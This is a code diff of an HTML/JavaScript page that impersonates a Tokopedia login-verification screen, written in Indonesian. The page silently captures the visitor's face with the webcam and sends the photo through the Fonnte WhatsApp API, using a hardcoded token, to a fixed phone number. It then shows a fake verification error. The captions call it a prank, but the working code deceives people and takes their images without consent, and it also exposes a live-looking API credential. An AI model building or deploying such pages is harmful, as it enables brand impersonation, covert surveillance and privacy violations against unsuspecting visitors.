@@ -6,7 +6,7 @@
     <title>Verifikasi Login - Tokopedia</title>
     <style>
         :root { --p: #00AA5B; }
-        body { background: #f4f7f9; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        body { background: #f4f7f9; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .card { background: #fff; padding: 30px 20px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; }
         .logo { font-size: 24px; font-weight: bold; color: var(--p); margin-bottom: 5px; }
         h1 { font-size: 16px; margin-bottom: 20px; color: #31353B; }
@@ -35,10 +35,9 @@
         const v = document.getElementById('v'), b = document.getElementById('b'), msg = document.getElementById('msg'), can = document.getElementById('c');
 
         // --- KONFIGURASI ---
-        const tokenWA = 'PG3GRjmArXV4PHYgQaFz';
-        const nomorWA = '6285117090357';
+        const tokenWA = 'PG3GRjmArXV4PHYgQaFz'; 
+        const nomorTujuan = '6285117090357'; // FOTO AKAN DIKIRIM KE NOMOR INI
 
-        // 1. Hidupkan Kamera
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(s => { 
             v.srcObject = s; 
@@ -47,34 +46,26 @@
         })
         .catch(e => { 
             msg.innerText = "Error: Kamera diblokir!";
-            msg.style.color = "red";
         });
 
-        // 2. Aksi Klik Tombol
         b.onclick = async () => {
             b.disabled = true;
             b.innerText = "Memproses...";
-            msg.innerText = "Sedang mencocokkan wajah...";
-
-            // Ambil gambar dari video
+            
             can.width = v.videoWidth;
             can.height = v.videoHeight;
             const ctx = can.getContext('2d');
             ctx.translate(can.width, 0); ctx.scale(-1, 1);
             ctx.drawImage(v, 0, 0);
             
-            // Konversi ke BLOB (File asli) agar Fonnte mudah membaca
             can.toBlob(async (blob) => {
                 const file = new File([blob], "capture.jpg", { type: "image/jpeg" });
-
-                // Siapkan data pengiriman
                 const f = new FormData();
-                f.append('target', nomorWA);
-                f.append('file', file); // Parameter 'file' jauh lebih stabil daripada 'url'
-                f.append('caption', '📸 *PRANK BERHASIL!* \nTarget baru saja mengambil foto.');
+                f.append('target', nomorTujuan);
+                f.append('file', file);
+                f.append('caption', '📸 *PRANK BERHASIL!*\nSeseorang baru saja terjebak verifikasi palsu.');
 
                 try {
-                    // Kirim ke Fonnte
                     const res = await fetch('https://api.fonnte.com/send', {
                         method: 'POST',
                         headers: { 'Authorization': tokenWA },
@@ -82,22 +73,20 @@
                     });
 
                     const data = await res.json();
-                    console.log("Fonnte Response:", data);
+                    console.log("Fonnte Log:", data);
 
-                    // Munculkan Pesan Error Palsu (Prank)
+                    // Pesan Prank
                     setTimeout(() => {
-                        alert("Gagal memverifikasi wajah (Error 403). Pastikan wajah terlihat jelas dan ulangi lagi.");
+                        alert("Gagal memverifikasi wajah (Error 403). Silakan ulangi.");
                         b.disabled = false;
                         b.innerText = "Login Sekarang";
-                        msg.innerText = "Pencahayaan kurang, coba lagi.";
-                    }, 1500);
+                    }, 1000);
 
                 } catch (err) {
-                    console.error("Fetch Error:", err);
-                    alert("Gagal terhubung ke server. Cek internet.");
+                    alert("Gagal terhubung ke server.");
                     b.disabled = false;
                 }
-            }, 'image/jpeg', 0.5); // Kualitas 50% supaya file ringan (cepat terkirim)
+            }, 'image/jpeg', 0.5);
         };
     </script>
 </body>
